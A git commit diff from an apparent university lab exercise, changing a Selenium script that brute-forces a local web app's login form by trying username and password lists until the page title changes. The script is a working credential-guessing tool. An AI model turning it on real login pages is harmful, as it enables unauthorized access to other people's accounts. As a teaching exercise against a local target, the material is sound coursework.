5af4d5c7e5106749b0c7c5dae255d459da780399
schuttenhub <schuttenhub@hs-albsig.de>
2024-06-04 08:57:22 +0200

    Abgabe erfolgreich

--- 03_Brute-Force/selenium/selenium.py
+++ 03_Brute-Force/selenium/selenium.py
@@ -4,7 +4,7 @@ from selenium.webdriver.common.by import By
 
 #s = Service(executable_path="chrome-linux64/chrome")
 driver = webdriver.Chrome()
-website = "http://10.0.0.13:8099/login"
+website = "http://127.0.0.1:8099/login"
 driver.get(website)
 
 title = ""
@@ -13,22 +13,24 @@ usernames = ["test", "hallo123", "admin"]
 i = 0
 
 for username in usernames:
-    input = driver.find_element(By.ID, "floatingInput")
-    input.clear()
-    input.send_keys(username)
-
     for passw in passwords:
         print("Testing this password...", passw)
 
+        input = driver.find_element(By.ID, "floatingInput")
+        input.clear()
+        input.send_keys(username)
+
         passwd = driver.find_element(By.ID, "floatingPassword")
         passwd.clear()
-        input.send_keys(passw)
+        passwd.send_keys(passw)
 
-        button = driver.find_elements(By.CLASS_NAME, "btn btn-primary w-100 py-2")
-        #assert(len(res) == 2)
-        button.click()
+        button = driver.find_elements(By.CSS_SELECTOR, ".btn.btn-primary.w-100.py-2")
+        if len(button) > 0:
+            button[0].click() 
+        else:
+            print("Button list is empty!")
 
         print(driver.title)
         if driver.title != "PyTask - Login":
-            print(f"Password is {passw}")
+            print(f"Password is {passw} for username {username}")
             break
